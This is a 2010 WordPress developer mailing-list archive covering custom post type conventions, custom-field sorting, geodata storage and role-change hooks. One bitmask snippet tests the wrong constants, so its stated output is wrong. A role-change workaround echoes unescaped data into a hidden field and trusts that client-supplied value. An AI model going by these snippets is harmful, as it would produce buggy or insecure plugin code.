	<AANLkTikb3_1vXgg4zO4tali1cYWmz4eIMdfFjiv__K5W@mail.gmail.com> 
	<29A8946A-3622-4FBA-B44F-DB59F8E04218@ftwr.co.uk>
	<4C3B9631.2090205@elfden.co.uk> 
	<0F8D6B2A-8EE8-4834-B4F1-928B9AC463A2@ftwr.co.uk>
	<4C3C1B12.2090202@elfden.co.uk> 
	<837FCBB5-89B3-4129-8700-E8962FC174E0@newclarity.net>
	<0be901cb2279$3dc06fc0$6401a8c0@dell8600> 
	<AANLkTilOhvhOASlWoRqVWX5J33x-DUuT5she9kf7p3H5@mail.gmail.com> 
	<AANLkTinAEQdUy3zWa-DghEsW3iaiSTVzkIStQTjM-_3K@mail.gmail.com>
Message-ID: <AANLkTimOWdExVoav5zDGJ_amZ84VKySlJqu89ZePC_6x@mail.gmail.com>

maybe

1)
http://wordnetweb.princeton.edu/perl/webwn?s=event&sub=Search+WordNet&o2=&o0=1&o7=&o5=&o1=1&o6=&o4=&o3=&h=
could
come in handy. (/
http://wordnetweb.princeton.edu/perl/webwn?o2=&o0=1&o7=&o5=&o1=1&o6=&o4=&o3=&s=case
 )
http://en.wikipedia.org/wiki/WordNet

2) probably the concept of "domain specific" could pinpoint the exact scope
of a CPT standard or from an architect level ties with
http://en.wikipedia.org/wiki/OASIS_(organization) BPEL standards

3) As well as some architectural theory on what kind of taxonomies
http://en.wikipedia.org/wiki/Taxonomy WordPress supports and which not

4) And how the complete solution is related to url hacking.

e.g. "movie":

a) I could make it a taxonomy: /movie/ would return nothing /movie/startrek
would return all movies named startrek
b) I could make it a CPT /movie/ returns all posts of that type,
/movie/startrek shows postings on startrek
c) I could make it a custom field attached to a post /movie returns nothing

its still a bit unclear without some architectural guidelines that would be
handy to add in the mix of standardization.

I think the thing is that every software project touching this area is in
the same boat. In drupal once can make these nodes, In wikipedia the
solutions is to display a list of pages which could mean... Webservices
people dream since the 2000 about a world wide discoverable set of services,
object oriented programming should theoretically have led to lots of
reusable objects "event" that every single person would use, but they all
uhm... face some problems.

Personally.... I think the wikipedia solution is the most practical ("not
beautiful but easy to implement"), but I dont know if that is possible with
CPT and the code behind it. see:
http://edward.de.leau.net/proposal-for-tag-handling-in-wordpress-for-tags-that-mean-different-things-20081102.html
but
specific for tags.

I don't think there is an essential difference between
taxonomies/terms/term-relationship and cpt in terms of what they are. I
really would like some theoretical background on that  to determine when to
use movie as a taxonomy term and when as a CPT and when as a custom field.

So maybe the above is one side of the difficulty "to taxonomize it" and the
other part is the TYPE of relationships it support, which maybe even more
difficult to standardize.






n Tue, Jul 13, 2010 at 7:46 PM, Simon Blackbourn <piemanek at gmail.com> wrote:

> I strongly believe that being open with post type & custom fields rather
> than namespacing them is the way to go in the long term. Closing things off
> and saying "this is my post type - hands off everyone else!" is
> antithetical
> to the whole ethos of the WordPress project.
>
> But rather than setting up yet more working groups and discussion forum,
> etc, which seems to me over-bureaucratic and unlikely to result in success,
> what if plugin authors simply put the information visibly on their plugin
> page, then over time 'the market' decides and those plugins that don't
> follow the standard set by others will become less popular.
>
> Clearly stating the post type and custom fields on your plugin page would
> encourage other developers to use the same type/fields in their plugin (or
> not to use the same if they want to avoid conflict). They could then say
> "compatible with the Blah Events plugin".
>
> So rather than having to dig through code to find these things out, it's
> right there out in the open on the plugin page for all to see.
>
> It might take a while to get the ball rolling, but once it gains critical
> mass then take-up should grow. Just a few high profile plugin authors doing
> this and writing about it on their blogs should kickstart things.
>
> Which then raises the question as to whether there should be some
> consistent
> place/format on the wp.org plugin pages for displaying this information?
> (either in the FAQ or Other Notes?)
>
> --
> Simon
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Edward de Leau
http://populair.eu

From peter.westwood at ftwr.co.uk  Tue Jul 13 20:35:40 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Tue, 13 Jul 2010 21:35:40 +0100
Subject: [wp-hackers] Sorting on Custom Fields
In-Reply-To: <4C3CB7CC.5000609@unFocus.com>
References: <4C3CB7CC.5000609@unFocus.com>
Message-ID: <D70CE78F-2D58-49ED-A59B-0478EB27902E@ftwr.co.uk>


On 13 Jul 2010, at 20:00, Kevin Newman wrote:

> I'm creating a plugin which will extend the post with a ton of custom fields (50 or so per post, mostly booleans, some numbers and some text). I'll need to be able to ORDER BY (to use SQL terminology) these fields (as well as search on them).
> 
> There is a plugin called wp-smart-sort which seems to do sorting by looping through the results of a custom query and storing the post data in an array and ordering that in memory ("seems to", because I didn't take the code apart all that thoroughly).
> 
> I'm leaning toward using a custom table, because sorting in server memory seems inefficient, and I have a crazy number of values anyway. But serializing those in a single custom field, doesn't seem crazy either.
> 
> Anyway, I'd love to see opinions on this. :-)
> 

Do we not have support for query_posts / WP_Query to do this already?

You can order by meta_keys and meta_values from what I recall.

-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From mikeschinkel at newclarity.net  Tue Jul 13 20:37:07 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 13 Jul 2010 15:37:07 -0500 (CDT)
Subject: [wp-hackers] Sorting on Custom Fields
In-Reply-To: <4C3CB7CC.5000609@unFocus.com>
References: <4C3CB7CC.5000609@unFocus.com>
Message-ID: <411A1170-2692-49E7-B2BD-994BC2163F49@newclarity.net>

Can you give some examples, in English, of the queries you'd like to perform, especially the more complex ones?

-Mike

On Jul 13, 2010, at 3:00 PM, Kevin Newman <CaptainN at unFocus.com> wrote:

> I'm creating a plugin which will extend the post with a ton of custom fields (50 or so per post, mostly booleans, some numbers and some text). I'll need to be able to ORDER BY (to use SQL terminology) these fields (as well as search on them).
> 
> There is a plugin called wp-smart-sort which seems to do sorting by looping through the results of a custom query and storing the post data in an array and ordering that in memory ("seems to", because I didn't take the code apart all that thoroughly).
> 
> I'm leaning toward using a custom table, because sorting in server memory seems inefficient, and I have a crazy number of values anyway. But serializing those in a single custom field, doesn't seem crazy either.
> 
> Anyway, I'd love to see opinions on this. :-)
> 
> Kevin N.
> 
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From Ken at adcSTUDIO.com  Tue Jul 13 20:54:25 2010
From: Ken at adcSTUDIO.com (Ken)
Date: Tue, 13 Jul 2010 16:54:25 -0400
Subject: [wp-hackers] Sorting on Custom Fields
In-Reply-To: <D70CE78F-2D58-49ED-A59B-0478EB27902E@ftwr.co.uk>
References: <4C3CB7CC.5000609@unFocus.com>
	<D70CE78F-2D58-49ED-A59B-0478EB27902E@ftwr.co.uk>
Message-ID: <i1ijq4$l4g$1@dough.gmane.org>

On 7/13/2010 4:35 PM, Peter Westwood wrote:
>
> On 13 Jul 2010, at 20:00, Kevin Newman wrote:
>
>> I'm creating a plugin which will extend the post with a ton of custom fields (50 or so per post, mostly booleans, some numbers and some text). I'll need to be able to ORDER BY (to use SQL terminology) these fields (as well as search on them).
>>
>> There is a plugin called wp-smart-sort which seems to do sorting by looping through the results of a custom query and storing the post data in an array and ordering that in memory ("seems to", because I didn't take the code apart all that thoroughly).
>>
>> I'm leaning toward using a custom table, because sorting in server memory seems inefficient, and I have a crazy number of values anyway. But serializing those in a single custom field, doesn't seem crazy either.
>>
>> Anyway, I'd love to see opinions on this. :-)
>>
>
> Do we not have support for query_posts / WP_Query to do this already?
>
> You can order by meta_keys and meta_values from what I recall.
>

http://wplookup.com is helpful for this.

You may be looking for this (Codex should be improved soon do to the 3.org)
http://codex.wordpress.org/Displaying_Posts_Using_a_Custom_Select_Query
http://codex.wordpress.org/Function_Reference/query_posts
http://codex.wordpress.org/Function_Reference/get_posts
http://codex.wordpress.org/Function_Reference/add_meta_box
http://codex.wordpress.org/Custom_Fields
http://codex.wordpress.org/Function_Reference/get_post_meta

I've had luck reading
http://core.trac.wordpress.org/browser/trunk/wp-includes/taxonomy.php
http://core.trac.wordpress.org/browser/trunk/wp-admin/includes/taxonomy.php
http://core.trac.wordpress.org/browser/trunk/wp-admin/includes/template.php




From mikeschinkel at newclarity.net  Tue Jul 13 22:16:55 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 13 Jul 2010 18:16:55 -0400
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <AANLkTinAEQdUy3zWa-DghEsW3iaiSTVzkIStQTjM-_3K@mail.gmail.com>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>
	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>
	<4C38FCCC.8030507@elfden.co.uk>
	<A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>
	<4C3ACEFD.5020208@elfden.co.uk> <4C3B0CF7.2000309@voceconnect.com>
	<AB0D8ECD-2A1B-410B-A413-218E233B3512@newclarity.net>
	<AANLkTikb3_1vXgg4zO4tali1cYWmz4eIMdfFjiv__K5W@mail.gmail.com>
	<29A8946A-3622-4FBA-B44F-DB59F8E04218@ftwr.co.uk>
	<4C3B9631.2090205@elfden.co.uk>
	<0F8D6B2A-8EE8-4834-B4F1-928B9AC463A2@ftwr.co.uk>
	<4C3C1B12.2090202@elfden.co.uk>
	<837FCBB5-89B3-4129-8700-E8962FC174E0@newclarity.net>
	<0be901cb2279$3dc06fc0$6401a8c0@dell8600>
	<AANLkTilOhvhOASlWoRqVWX5J33x-DUuT5she9kf7p3H5@mail.gmail.com>
	<AANLkTinAEQdUy3zWa-DghEsW3iaiSTVzkIStQTjM-_3K@mail.gmail.com>
Message-ID: <DFF63FE2-46BF-4A8F-9967-578CF3FBB2CE@newclarity.net>

On Jul 13, 2010, at 1:46 PM, Simon Blackbourn wrote:
> I strongly believe that being open with post type & custom fields rather
> than namespacing them is the way to go in the long term. Closing things off
> and saying "this is my post type - hands off everyone else!" is antithetical
> to the whole ethos of the WordPress project.

Point of note, I don't think anyone is saying "Hands off."  The concept is instead for someone to think "I'm working on something and I don't want to accidentally tread on anything someone else is doing or might do so I'm going to do it off in a corner where my stuff can't hurt anyone."  

The "wp_" prefix isn't "Hands off of my post type" either, it's just "Don't start your post type with 'wp_'  because if you do it will almost certainly conflict with something added to WP in the future." (that assumes the 'wp_' convention would be adopted by the core team but even if not that is what was proposed, not a "hands off.")  

> But rather than setting up yet more working groups and discussion forum,
> etc, which seems to me over-bureaucratic and unlikely to result in success,

No more bureaucratic than the hackers list and trac+codex.  That works.

> what if plugin authors simply put the information visibly on their plugin
> page, then over time 'the market' decides and those plugins that don't
> follow the standard set by others will become less popular.

Problems with that are several fold, but can be easily illustrated by ancient Chinese proverb:

Man with one watch knows the time; man with many watches never sure.

> Clearly stating the post type and custom fields on your plugin page would
> encourage other developers to use the same type/fields in their plugin (or
> not to use the same if they want to avoid conflict). They could then say
> "compatible with the Blah Events plugin".

So where would the specs of "Blah Events plugin" be posted?  (Back to the need for a central point of authority.)

> So rather than having to dig through code to find these things out, it's
> right there out in the open on the plugin page for all to see.

A central place can be open too.

> It might take a while to get the ball rolling, but once it gains critical
> mass then take-up should grow. Just a few high profile plugin authors doing
> this and writing about it on their blogs should kickstart things.

If this would work there would already be a similar movement sorted in the Drupal community.  I could write a lot more about why it won't work, but I think Kevin Kelly tells a story in his book "New Rules for the New Economy" that says it much better than anything I could write:

"Without some element of governance from the top, bottom-up control will freeze when options are many. Without some element of leadership, the many at the bottom will be paralyzed with choices."

To drive the point home you can read his anecdote in the five (5) paragraphs that precede the above quote here:

http://www.kk.org/newrules/newrules-1.html

BTW, for those who have never read "New Rules for the New Economy", highly recommended. If there were only one business of technology book I could read for the rest of my life I'd still pick it.


On Jul 13, 2010, at 4:28 PM, Edward de Leau wrote:
> its still a bit unclear without some architectural guidelines that would be
> handy to add in the mix of standardization.
> 
> I think the thing is that every software project touching this area is in
> the same boat. 

I think any attempt to model an event perfectly (or anything else for that matter) would by definition be crushed by it's own weight, and fail miserably.

Instead what I've been discussing would be lightweight and basic structures that cover the well-known pattern upon which most reasonable people agree and leave anything else to specific plugins.  So in a sense, plugins that implemented a given well known post type would have their own "core" set of custom fields and maybe some other aspects.

And there is nothing to say there couldn't be multiple plugins that address similar aspects differently.  For example, maybe there would be a generic "Event" post type, but  then another group creates a "Concert" post type because they need something more specific than "Event" can and will be. Would having both "Event" and "Concert" be perfect, after all plugins that work with Event probably won't work with Concert?  No, it wouldn't be perfect; life isn't perfect either. But it would be better than total chaos.

Further, someone might choose to create "Simple Event" in addition to "Event" because they are not happy with the direction of "Event."  That could be okay too.

The less process applied to this the better; what is simply needed IMO is a well-known central place to gather to discuss and document efforts.

> I don't think there is an essential difference between
> taxonomies/terms/term-relationship and cpt in terms of what they are. I
> really would like some theoretical background on that  to determine when to
> use movie as a taxonomy term and when as a CPT and when as a custom field.

I agree that the namespacing problem is definitely similar between CPTs and taxonomy terms, if not the same.  

OTOH, CPTs represent a much greater opportunity for benefit if interoperability can be achieved. CPTs can form the basic of complete modules including sophisticated workflow. High level business functionality can be built around CPTs whereas taxonomies not so much.  Taxonomies can be used to elaborate ends but fundamentally they really are just about classifying content.  CPTs, on the other hand, enable end-user benefits in a wide reaching manner that taxonomies simply can't match.

On Jul 13, 2010, at 1:46 PM, Simon Blackbourn wrote:
> Which then raises the question as to whether there should be some consistent
> place/format on the wp.org plugin pages for displaying this information?
> (either in the FAQ or Other Notes?)

Basically, that's what I've been suggesting, a central place.  

Anyway, I'm going to go ahead and put a stake in the ground by adding my ideas to the codex as soon as I have a spare hour to work on it.  From there we can see how it works or if it needs to be adjusted.

-Mike

From CaptainN at unFocus.com  Tue Jul 13 23:00:43 2010
From: CaptainN at unFocus.com (Kevin Newman)
Date: Tue, 13 Jul 2010 19:00:43 -0400
Subject: [wp-hackers] Sorting on Custom Fields
In-Reply-To: <i1ijq4$l4g$1@dough.gmane.org>
References: <4C3CB7CC.5000609@unFocus.com>	<D70CE78F-2D58-49ED-A59B-0478EB27902E@ftwr.co.uk>
	<i1ijq4$l4g$1@dough.gmane.org>
Message-ID: <4C3CF01B.8020507@unFocus.com>

  On 7/13/10 4:54 PM, Ken wrote:
>>> erminology) these fields (as well as search on them).
>>>
>>> There is a plugin called wp-smart-sort which seems to do sorting by 
>>> looping through the results of a custom query and storing the post 
>>> data in an array and ordering that in memory ("seems to", because I 
>>> didn't take the code apart all that thoroughly).
>>>
>>> I'm leaning toward using a custom table, because sorting in server 
>>> memory seems inefficient, and I have a crazy number of values 
>>> anyway. But serializing those in a single custom field, doesn't seem 
>>> crazy either.
>>>
>>> Anyway, I'd love to see opinions on this. :-)
>>>
>>
>> Do we not have support for query_posts / WP_Query to do this already?
>>
>> You can order by meta_keys and meta_values from what I recall.
>>
>
> http://wplookup.com is helpful for this.
>
> You may be looking for this (Codex should be improved soon do to the 
> 3.org)
> http://codex.wordpress.org/Displaying_Posts_Using_a_Custom_Select_Query
> http://codex.wordpress.org/Function_Reference/query_posts
> http://codex.wordpress.org/Function_Reference/get_posts
> http://codex.wordpress.org/Function_Reference/add_meta_box
> http://codex.wordpress.org/Custom_Fields 

Oh! I didn't even look at that yet. Time to dig in!

Thanks guys!

Kevin N.



From dylan.k.kuhn at gmail.com  Tue Jul 13 23:39:51 2010
From: dylan.k.kuhn at gmail.com (Dylan Kuhn)
Date: Tue, 13 Jul 2010 17:39:51 -0600
Subject: [wp-hackers] Geodata storage
In-Reply-To: <4C0F9895.7010502@gunters.org>
References: <AANLkTimMsA0ZVRZWe9UKJYe5pCvfeWlDRhcmgV3bvF83@mail.gmail.com> 
	<4C0F941C.5030806@gunters.org>
	<AANLkTinVj818THkk3YrjUJkfLaflmMxkCPhQK8PgAP9L@mail.gmail.com> 
	<4C0F9895.7010502@gunters.org>
Message-ID: <AANLkTikX90nDELPdMQ53wiFBG_fN01LOzP1ostqUjxnJ@mail.gmail.com>

On Wed, Jun 9, 2010 at 7:35 AM, Dougal Campbell <dougal at gunters.org> wrote:

> If you're searching for posts based on location, you'll want them
>> separate so as to make use of SQL comparisons. WHERE latitude is
>> between X and Y, sort of thing.
>>
>>
>>
>
> Good point, I didn't think about using BETWEEN to limit the searches. That
> would be a quick way to find matches within a rectangular area. And like I
> said, if you combine them, you'd still have to decouple them for usage
> later. So nevermind on that :)
>
>
Sorry I'm so late to this thread. My plugin Geo Mashup [1] does just the
kind of stuff being discussed here. It grew out of the old Geo plugin [2]
which stored coordinates as latitude / longitude pair in postmeta with key
_geo_location. I moved away from this because it was difficult to do spatial
queries, which started with bounding box queries along the lines of this
sort of BETWEEN query, and grew to include radius queries. Text searching
with results sorted by distance is a popular feature request I'm still
working on.

I didn't do rigorous testing, but performance seemed better to me with a
table of indexed latitude and longitude, so I went that way. I also
considered MySQL spatial extensions, but I wanted to be able to use standard
SQL queries. For the radius query I was also influenced by a paper that
still seems to be prevalent [3] that addresses some performance issues and
compares various methods. It seems like it would be difficult to implement
with postmeta, but if it were shown to work well I would definitely consider
moving back that way. If not, I'll probably have to do some kind of
synchronization with the standard fields.

[1] http://wordpress.org/extend/plugins/geo-mashup/
[2] http://wordpress.org/extend/plugins/geo/
[3] http://www.scribd.com/doc/2569355/Geo-Distance-Search-with-MySQL

-dylan-

From mda at blogwaffe.com  Tue Jul 13 23:49:00 2010
From: mda at blogwaffe.com (Michael D Adams)
Date: Tue, 13 Jul 2010 16:49:00 -0700
Subject: [wp-hackers] Geodata storage
In-Reply-To: <AANLkTikX90nDELPdMQ53wiFBG_fN01LOzP1ostqUjxnJ@mail.gmail.com>
References: <AANLkTimMsA0ZVRZWe9UKJYe5pCvfeWlDRhcmgV3bvF83@mail.gmail.com> 
	<4C0F941C.5030806@gunters.org>
	<AANLkTinVj818THkk3YrjUJkfLaflmMxkCPhQK8PgAP9L@mail.gmail.com> 
	<4C0F9895.7010502@gunters.org>
	<AANLkTikX90nDELPdMQ53wiFBG_fN01LOzP1ostqUjxnJ@mail.gmail.com>
Message-ID: <AANLkTillvTv4inBEFmo9ZySfJ749njpfrCub-0j4d4fu@mail.gmail.com>

On Tue, Jul 13, 2010 at 4:39 PM, Dylan Kuhn <dylan.k.kuhn at gmail.com> wrote:
> It seems like it would be difficult to implement
> with postmeta, but if it were shown to work well I would definitely consider
> moving back that way. If not, I'll probably have to do some kind of
> synchronization with the standard fields.

If you use external tables or indices of any type, I highly recommend
synchronizing them to the standard postmeta keys discussed in this
thread and outlined here: http://codex.wordpress.org/Geodata

Not only do you increase interoperability with other plugins and apps,
you also ensure data portability: postmeta ends up in the WP Export
file, so import/export is taken care of for free.

Mike
--mdawaffe

From andrew at graymerica.com  Wed Jul 14 00:36:30 2010
From: andrew at graymerica.com (Andrew Gray)
Date: Tue, 13 Jul 2010 20:36:30 -0400
Subject: [wp-hackers] action on change of role only
Message-ID: <1D645979-F12E-4EB0-A3B4-A2B5DD243F6E@graymerica.com>

I am working on a plugin to automatically notify users when the admin changes their role from pending to subscriber.   

We were having some emails not arrive to activate and this is a way to streamline the activation process.

Everything works fine with the hook in to the following action

add_action('set_user_role', 'change_role_notify' , '' , '2');  

change_role_notify is my function, the action was added based on this trac ticket http://core.trac.wordpress.org/changeset/12028

I am able to get the user id and the new role in the function and fire off the email.  I can not figure out how to get the previous role to compare.

The issue I am having is the action is fired every time any part of the user information is edited.  

For example, if an admin changes the password,  the action is fire off, even if the role remains the same.

Does anyone have any idea how to get the previous role to see if it changed before the action in the hook or if there is another action I should attach to,

thanks,

Andrew



From sergeybiryukov.ru at gmail.com  Wed Jul 14 01:23:32 2010
From: sergeybiryukov.ru at gmail.com (Sergey Biryukov)
Date: Wed, 14 Jul 2010 05:23:32 +0400
Subject: [wp-hackers] action on change of role only
In-Reply-To: <1D645979-F12E-4EB0-A3B4-A2B5DD243F6E@graymerica.com>
References: <1D645979-F12E-4EB0-A3B4-A2B5DD243F6E@graymerica.com>
Message-ID: <AANLkTiksuQoIZ9z1qG8jY9Qo3jFj1PR8O9YGv9WAP9GS@mail.gmail.com>

You can try something like this:

function change_role_notify($meta_id, $object_id, $meta_key, $_meta_value) {
	$user = new WP_User($object_id);
	if ( $meta_key == $user->cap_key ) {
		$previous_user_role = array_shift( $user->roles );
		$current_user_role = array_shift( array_keys($_meta_value) );
		...
	}
}
add_action('update_user_meta', 'change_role_notify', 10, 4);

--
Sergey



On Wed, Jul 14, 2010 at 4:36 AM, Andrew Gray <andrew at graymerica.com> wrote:
> I am working on a plugin to automatically notify users when the admin changes their role from pending to subscriber.
>
> We were having some emails not arrive to activate and this is a way to streamline the activation process.
>
> Everything works fine with the hook in to the following action
>
> add_action('set_user_role', 'change_role_notify' , '' , '2');
>
> change_role_notify is my function, the action was added based on this trac ticket http://core.trac.wordpress.org/changeset/12028
>
> I am able to get the user id and the new role in the function and fire off the email. ?I can not figure out how to get the previous role to compare.
>
> The issue I am having is the action is fired every time any part of the user information is edited.
>
> For example, if an admin changes the password, ?the action is fire off, even if the role remains the same.
>
> Does anyone have any idea how to get the previous role to see if it changed before the action in the hook or if there is another action I should attach to,
>
> thanks,
>
> Andrew
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp at andrewnacin.com  Wed Jul 14 01:34:33 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Tue, 13 Jul 2010 21:34:33 -0400
Subject: [wp-hackers] action on change of role only
In-Reply-To: <AANLkTiksuQoIZ9z1qG8jY9Qo3jFj1PR8O9YGv9WAP9GS@mail.gmail.com>
References: <1D645979-F12E-4EB0-A3B4-A2B5DD243F6E@graymerica.com> 
	<AANLkTiksuQoIZ9z1qG8jY9Qo3jFj1PR8O9YGv9WAP9GS@mail.gmail.com>
Message-ID: <AANLkTilnWW-tGUU797zcBnzaS3u5T0vtDnmTVI-MJHHK@mail.gmail.com>

On Wed, Jul 14, 2010 at 4:36 AM, Andrew Gray <andrew at graymerica.com> wrote:

> Does anyone have any idea how to get the previous role to see if it changed
> before the action in the hook or if there is another action I should attach
> to,
>

On Tue, Jul 13, 2010 at 9:23 PM, Sergey Biryukov <sergeybiryukov.ru@
gmail.com> wrote:

> add_action('update_user_meta', 'change_role_notify', 10, 4);


I would not hook into update_user_meta... Let's say we decided to change how
we stored user roles in the future. You should always use the hooks
intended, or your plugin may break in the future if the storage schema
changes. (And it probably will in the next two releases.)

So, here's my suggestion --

1. When creating a pending user, drop in a meta key/value pair you can check
for later. Then on on role change, look for the meta key. If it exists,
you'll know the user was pending. (Then delete it.)

2. Create a ticket at http://core.trac.wordpress.org and suggest that the
old $this->roles is set to a variable before being unset, and then passed to
the action. You are welcome to assign the ticket to me and I will take care
of it for 3.1. You can also submit a patch if you want (preferred!).

Also, without starting a tangental discussion, can we get back to
bottom-posting? Top-posting replies is not proper mailing list etiquette.

From sergeybiryukov.ru at gmail.com  Wed Jul 14 01:49:32 2010
From: sergeybiryukov.ru at gmail.com (Sergey Biryukov)
Date: Wed, 14 Jul 2010 05:49:32 +0400
Subject: [wp-hackers] action on change of role only
In-Reply-To: <AANLkTilnWW-tGUU797zcBnzaS3u5T0vtDnmTVI-MJHHK@mail.gmail.com>
References: <1D645979-F12E-4EB0-A3B4-A2B5DD243F6E@graymerica.com> 
	<AANLkTiksuQoIZ9z1qG8jY9Qo3jFj1PR8O9YGv9WAP9GS@mail.gmail.com> 
	<AANLkTilnWW-tGUU797zcBnzaS3u5T0vtDnmTVI-MJHHK@mail.gmail.com>
Message-ID: <AANLkTinGENWbIZi11FNP7p5p6MvrGQv4zMjUWmwK7ORi@mail.gmail.com>

On Wed, Jul 14, 2010 at 5:34 AM, Andrew Nacin <wp at andrewnacin.com> wrote:
> I would not hook into update_user_meta... Let's say we decided to change how
> we stored user roles in the future. You should always use the hooks
> intended, or your plugin may break in the future if the storage schema
> changes. (And it probably will in the next two releases.)

Thanks! Taken into account.

--
Sergey

From dylan.k.kuhn at gmail.com  Wed Jul 14 01:54:06 2010
From: dylan.k.kuhn at gmail.com (Dylan Kuhn)
Date: Tue, 13 Jul 2010 19:54:06 -0600
Subject: [wp-hackers] Geodata storage
In-Reply-To: <AANLkTillvTv4inBEFmo9ZySfJ749njpfrCub-0j4d4fu@mail.gmail.com>
References: <AANLkTimMsA0ZVRZWe9UKJYe5pCvfeWlDRhcmgV3bvF83@mail.gmail.com> 
	<4C0F941C.5030806@gunters.org>
	<AANLkTinVj818THkk3YrjUJkfLaflmMxkCPhQK8PgAP9L@mail.gmail.com> 
	<4C0F9895.7010502@gunters.org>
	<AANLkTikX90nDELPdMQ53wiFBG_fN01LOzP1ostqUjxnJ@mail.gmail.com> 
	<AANLkTillvTv4inBEFmo9ZySfJ749njpfrCub-0j4d4fu@mail.gmail.com>
Message-ID: <AANLkTikmM6ZnxVy33NHZMmpiB66xDSfiFz7B51FPuOPQ@mail.gmail.com>

On Tue, Jul 13, 2010 at 5:49 PM, Michael D Adams <mda at blogwaffe.com> wrote:

> If you use external tables or indices of any type, I highly recommend
> synchronizing them to the standard postmeta keys discussed in this
> thread and outlined here: http://codex.wordpress.org/Geodata
>
> Not only do you increase interoperability with other plugins and apps,
> you also ensure data portability: postmeta ends up in the WP Export
> file, so import/export is taken care of for free.
>
>
Thanks, I definitely see the need to adopt a standard, either natively or
via synchronization.

One issue that the Codex page should mention I think is that only ONE
location can be associated with a post this way, since multiple instances of
geo_latitude and geo_longitude values couldn't be matched up. Apps will have
to be responsible for this data integrity since WordPress allows it.

-dylan-

From bulk at thecodecave.com  Wed Jul 14 03:12:24 2010
From: bulk at thecodecave.com (Brian Layman)
Date: Tue, 13 Jul 2010 23:12:24 -0400
Subject: [wp-hackers] Sorting on Custom Fields
In-Reply-To: <D70CE78F-2D58-49ED-A59B-0478EB27902E@ftwr.co.uk>
References: <4C3CB7CC.5000609@unFocus.com>
	<D70CE78F-2D58-49ED-A59B-0478EB27902E@ftwr.co.uk>
Message-ID: <031f01cb2302$638bbc80$2aa33580$@com>

> custom fields - 50 or so per post, mostly booleans

Might I suggest an alternative?  

Rather than storing dozens of boolean values, use a bit mask.

A single integer stored in postmeta as myplugin_flags can control all your
options. A 32bit integer or a 64bit int would likely give you more options
than you need.  Just create constants for your values and do bit wise
comparisons with the option value.

So to rattle off some code, something like:
$myplugin_flags = 10;  //10 in decimal is 1010 in binary 
define(OPTION1, 1);
define(OPTION2, 2); 
define(OPTION3, 4);
define(OPTION4, 8);
if ($myplugin_flags & OPTION1) echo "Option 1 is on.<br />";
if ($myplugin_flags & OPTION2) echo "Option 2 is on.<br />";
if ($myplugin_flags & OPTION1) echo "Option 3 is on.<br />";
if ($myplugin_flags & OPTION3) echo "Option 4 is on.<br />";
would produce:
Option 2 is on.
Option 4 is on.

That's loading only one option from the db/cache and when you multiply that
by 50 an then by all the posts that could be loaded, it saves a lot of
effort.

______________________________________________
Brian Layman
eHermits, Inc.
TheCodeCave.com?/?eHermitsInc.com?/?twitter.com/BrianLayman /
facebook.com/eHermit


-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Peter Westwood
Sent: Tuesday, July 13, 2010 4:36 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Sorting on Custom Fields


On 13 Jul 2010, at 20:00, Kevin Newman wrote:

> I'm creating a plugin which will extend the post with a ton of custom
fields (50 or so per post, mostly booleans, some numbers and some text).
I'll need to be able to ORDER BY (to use SQL terminology) these fields (as
well as search on them).
> 
> There is a plugin called wp-smart-sort which seems to do sorting by
looping through the results of a custom query and storing the post data in
an array and ordering that in memory ("seems to", because I didn't take the
code apart all that thoroughly).
> 
> I'm leaning toward using a custom table, because sorting in server memory
seems inefficient, and I have a crazy number of values anyway. But
serializing those in a single custom field, doesn't seem crazy either.
> 
> Anyway, I'd love to see opinions on this. :-)
> 

Do we not have support for query_posts / WP_Query to do this already?

You can order by meta_keys and meta_values from what I recall.

-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


From andrew at graymerica.com  Wed Jul 14 04:34:06 2010
From: andrew at graymerica.com (Andrew Gray)
Date: Wed, 14 Jul 2010 00:34:06 -0400
Subject: [wp-hackers] action on change of role only
Message-ID: <E29A9A07-60A5-489F-9417-9596024B4A91@graymerica.com>

Sergey,

thank you for the code, 
> 
> function change_role_notify($meta_id, $object_id, $meta_key, $_meta_value) {
> 	$user = new WP_User($object_id);
> 	if ( $meta_key == $user->cap_key ) {
> 		$previous_user_role = array_shift( $user->roles );
> 		$current_user_role = array_shift( array_keys($_meta_value) );
> 		...
> 	}
> }
> add_action('update_user_meta', 'change_role_notify', 10, 4);
> 


However, I can not get this action to fire on the update, when I used the multiple user role change function from the user list

Here is what I did (which is pretty hackish, but worked)

I added another action, that stores the previous role in the bottom of the user info edit screen form in a hidden field

add_action('edit_user_profile' , 'store_previous_role') ;

function store_previous_role() {
		$user_info = get_userdata($_REQUEST['user_id']);
		$previousRoles = implode("," , array_keys($user_info->wp_capabilities)) ; 
		echo "<input type='hidden' name='previousRole' value='$previousRoles'>" ; 
	}

In my change_role_notify function, I now look to see if the function is being called from the multiple user select list or a single menu form and react correctly,

function change_role_notify($id, $role)  {

if (isset($_REQUEST['changeit']) and $_REQUEST['changeit'] != 'Change') { return ; }   // from the multi select list
